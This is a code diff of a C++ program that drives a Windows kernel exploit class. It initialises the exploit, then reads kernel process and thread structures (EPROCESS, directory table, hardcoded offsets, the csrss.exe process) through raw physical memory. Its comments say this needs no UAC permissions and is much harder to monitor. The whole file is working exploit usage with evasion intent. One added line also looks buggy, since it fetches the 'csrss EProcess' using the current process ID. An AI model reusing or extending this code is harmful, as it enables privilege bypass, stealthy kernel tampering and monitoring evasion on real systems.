@@ -1,32 +1,50 @@
 #include <Windows.h>
 #include "Kernel.h"
 int main() {
-	Kernel Exploit;
-	if (!Exploit.Initialize(true)) { // Start the driver and initialize the exploit
-		printf("[-] Exploit failed to initialize\n");
-		return -1;
-	} 
-	Exploit.Cleanup(); // By this point, the driver is fully stopped from running
-	// Everything below is read/written using the exploit and does not need UAC permissions or even have the driver installed after this point
-	// After running the exploit once, change Exploit.Initialize(true) to Exploit.Initialize(false) to prevent the driver from loading the bypass again 
-	// since after this point the bypass will be loaded no matter what and no longer needs the driver for anything
-	__int64 Process = Exploit.EProcess(GetCurrentProcessId());
-	printf("[+] Current EProcess: (virtual) %llx\n", Process);
-	__int64 DirectoryTable = Exploit.GetProcessDirectoryTable(Process);
-	printf("[+] Current Directory Table: %llx\n", DirectoryTable);
-	int UniqueProcessId;
-	Exploit.ReadPhysical(Exploit.TranslateLinearAddress(DirectoryTable, Process + 0x440), &UniqueProcessId, 4); //_EPROCESS->UniqueProcessId
-	printf("[+] Current UniqueProcessId: %d\n", UniqueProcessId);
-	// Or you can utilize the Read<T> wrapper to simplify the above code
-	__int64 SectionBaseAddress = Exploit.Read<__int64>(Exploit.TranslateLinearAddress(DirectoryTable, Process + 0x520));
-	printf("[+] Current SectionBaseAddress: (virtual) %llx\n", SectionBaseAddress); //_EPROCESS->SectionBaseAddress
+    Kernel exploit;
+    NTSTATUS exploitStatus = exploit.Initialize(false);
+    // Initialize the exploit
+    if (exploitStatus) {
+        printf("[-] Exploit failed to initialize (%llx)\n", exploitStatus);
+        return -1;
+    }
+    else {
+        // Cleanup after initialization
+        NTSTATUS cleanupStatus = exploit.Cleanup();
+        if (cleanupStatus) {
+            printf("[-] Exploit failed to cleanup (%llx)\n", cleanupStatus);
+            return -1;
+        }
+    }    
 
-	DWORD ThreadId = GetCurrentThreadId();
-	printf("[+] Current Thread Id: %d\n", ThreadId);
-	__int64 Ethread = Exploit.EThread(DirectoryTable, Process, ThreadId);
-	printf("[+] Current Ethread: %llx\n", Ethread);
-	int csrssProcessId = Exploit.ProcessId("csrss.exe", 1);
-	printf("[+] csrss ProcessId: %d\n", csrssProcessId);
+    // Retrieve current process details
+    __int64 currentProcess = exploit.EProcess(GetCurrentProcessId());
+    printf("[+] Current EProcess (virtual): %llx\n", currentProcess);
 
-	Sleep(-1);
+    __int64 directoryTable = exploit.GetProcessDirectoryTable(currentProcess);
+    printf("[+] Current Directory Table: %llx\n", directoryTable);
+
+    int uniqueProcessId;
+    exploit.ReadPhysical(exploit.TranslateLinearAddress(directoryTable, currentProcess + 0x440), &uniqueProcessId, 4);
+    printf("[+] Current UniqueProcessId: %d\n", uniqueProcessId);
+
+    // Simplified reading using template
+    __int64 sectionBaseAddress = exploit.Read<__int64>(exploit.TranslateLinearAddress(directoryTable, currentProcess + 0x520));
+    printf("[+] Current SectionBaseAddress (virtual): %llx\n", sectionBaseAddress);
+
+    // Demonstration of operations using physical memory instead of there kernel functions such as PsLookupProcessByProcessId or PsLookupThreadByThreadId
+    // Making it much harder to monitor
+    DWORD currentThreadId = GetCurrentThreadId();
+    printf("[+] Current Thread Id: %d\n", currentThreadId);
+
+    __int64 currentEthread = exploit.EThread(directoryTable, currentProcess, currentThreadId);
+    printf("[+] Current Ethread: %llx\n", currentEthread);
+
+    int csrssProcessId = exploit.ProcessId("csrss.exe", 1);
+    printf("[+] csrss ProcessId: %d\n", csrssProcessId);
+
+    __int64 csrssEProcess = exploit.EProcess(GetCurrentProcessId());
+    printf("[+] csrss EProcess: %llx\n", csrssEProcess);
+
+    Sleep(-1);
 }
